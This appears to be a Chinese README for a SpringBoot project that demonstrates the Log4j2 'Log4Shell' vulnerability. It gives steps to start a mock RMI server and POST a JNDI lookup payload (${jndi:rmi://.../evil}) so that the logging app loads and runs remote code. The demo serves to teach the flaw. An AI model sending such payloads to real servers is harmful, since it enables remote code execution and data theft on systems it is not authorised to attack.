# 工程简介

# SpringBoot + Log4j2测试高危漏洞演示代码
 
 演示场景1：本地测试log4j2日志打印通过植入执行代码非法提取信息；
 
          测试方式：运行com.itpkm.springmvclog4j2.test.Log4j2SimpleTest

 演示场景2：通过web应用入口植入攻击代码以获得远程代码执行权限；

          测试步骤：
          1）运行com.itpkm.springmvclog4j2.SpringmvcLog4j2Application模拟正常应用启动；
          2）运行com.itpkm.springmvclog4j2.rmi.RmiServer模拟远程RMI服务；
          3）通过postman post请求发送body-raw类型参数：${jndi:rmi://{RMIServerIP}:{RMIServerPort}/evil}
          4）观察SpringmvcLog4j2Application控制台日志输出，日志输出即代表着攻击型代码的执行——即JVM所在服务受攻击
 要求：Log4j2 < v2.15.0
 
 ![img_1.png](doc\\img_1.png)

# 原理说明（待补充）

